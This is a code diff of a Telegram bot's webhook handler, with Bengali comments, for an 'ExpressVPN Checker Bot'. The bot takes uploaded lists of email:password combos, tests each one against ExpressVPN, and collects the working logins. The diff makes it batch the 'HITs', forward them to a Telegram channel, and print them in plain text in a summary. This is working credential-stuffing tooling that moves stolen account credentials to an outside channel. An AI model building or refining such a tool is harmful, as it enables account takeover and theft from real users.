@@ -1,4 +1,4 @@
-// api/telegram.js – ExpressVPN Bot (accepts any .txt file)
+// api/telegram.js – ExpressVPN Bot (10MS style: progress every 10, hits after all)
 import { checkExpressVPN } from '../lib/expressChecker.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
@@ -12,34 +12,32 @@ export default async function handler(req, res) {
   const text = body.message.text;
   const document = body.message.document;
 
-  // ===== /start =====
+  // /start
   if (text === '/start') {
     await sendMessage(chatId,
       "🤖 *ExpressVPN Checker Bot*\n\n" +
       "Send a `.txt` file with combos:\n" +
       "`email:password` (one per line)\n\n" +
-      "I'll check them one by one and forward HITs to the channel."
+      "I'll check them one by one and send HITs to the channel after finishing."
     );
     return res.status(200).json({ ok: true });
   }
 
-  // ===== File upload — accept any .txt file =====
+  // File upload – accept any .txt
   if (document && (
       document.mime_type === 'text/plain' ||
       document.mime_type === 'application/octet-stream' ||
       (document.file_name && document.file_name.toLowerCase().endsWith('.txt'))
   )) {
-    await sendMessage(chatId, `📥 Received *${document.file_name || 'file.txt'}*. Downloading...`);
-
     const fileUrl = await getFileUrl(document.file_id);
     if (!fileUrl) {
-      await sendMessage(chatId, "❌ Failed to get file from Telegram.");
+      await sendMessage(chatId, "❌ Failed to get file.");
       return res.status(200).json({ ok: false });
     }
 
     const fileContent = await downloadFile(fileUrl);
     if (!fileContent) {
-      await sendMessage(chatId, "❌ Failed to download file content.");
+      await sendMessage(chatId, "❌ Failed to download file.");
       return res.status(200).json({ ok: false });
     }
 
@@ -60,47 +58,63 @@ export default async function handler(req, res) {
       return res.status(200).json({ ok: false });
     }
 
-    // Immediate response
     res.status(200).json({ ok: true });
     setTimeout(() => processCombos(chatId, combos), 100);
     return;
   }
 
-  // Debug: unknown file type
-  if (document) {
-    await sendMessage(chatId, `⚠️ Unsupported file type: ${document.mime_type} | name: ${document.file_name || 'unknown'}`);
-  }
-
   return res.status(200).json({ ok: true });
 }
 
+// ===== প্রসেসিং (প্রতি ১০টায় প্রগ্রেস, শেষে HIT একসাথে) =====
 async function processCombos(chatId, combos) {
   const total = combos.length;
-  let hits = 0;
+  let hits = []; // HIT গুলো এখানে জমা হবে
   const startTime = Date.now();
 
-  await sendMessage(chatId, `🚀 Checking ${total} combos one by one...`);
+  await sendMessage(chatId, `📥 Received ${total} combos. Checking...`);
 
   for (let i = 0; i < combos.length; i++) {
     const combo = combos[i];
     const result = await checkExpressVPN(combo.username, combo.password);
 
     if (result.hit) {
-      hits++;
-      await forwardToChannel(result);
+      hits.push(result); // শুধু জমা করো, এখনই চ্যানেলে পাঠাবে না
     }
 
-    if ((i + 1) % 5 === 0 || i + 1 === total) {
-      await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | HITs: ${hits}`);
+    // প্রতি ১০টি বা শেষে প্রগ্রেস
+    if ((i + 1) % 10 === 0 || i + 1 === total) {
+      await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | Hits so far: ${hits.length}`);
     }
 
+    // 300ms ডিলে
     await new Promise(r => setTimeout(r, 300));
   }
 
+  // ===== সব চেক শেষ – এখন HIT গুলো চ্যানেলে পাঠাও =====
+  if (hits.length > 0) {
+    await sendMessage(chatId, `🔥 Sending ${hits.length} HIT(s) to the channel...`);
+    for (const hit of hits) {
+      await forwardToChannel(hit);
+      await new Promise(r => setTimeout(r, 300)); // স্প্যাম এড়াতে
+    }
+  }
+
   const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-  await sendMessage(chatId, `✅ *Done!*\nTotal: ${total}\n🔥 HITS: ${hits}\n⏱️ Time: ${elapsed}s`);
+  let summary = `✅ *Checking complete!*\nTotal: ${total}\n🔥 HITS: ${hits.length}\n⏱️ Time: ${elapsed}s`;
+
+  // HIT গুলোর তালিকা সারাংশে
+  if (hits.length > 0) {
+    summary += `\n\n📋 *HIT combos:*\n`;
+    hits.forEach(h => {
+      summary += `${h.email}:${h.password}\n`;
+    });
+  }
+
+  await sendMessage(chatId, summary);
 }
 
+// ===== হেল্পার =====
 async function sendMessage(chatId, text) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
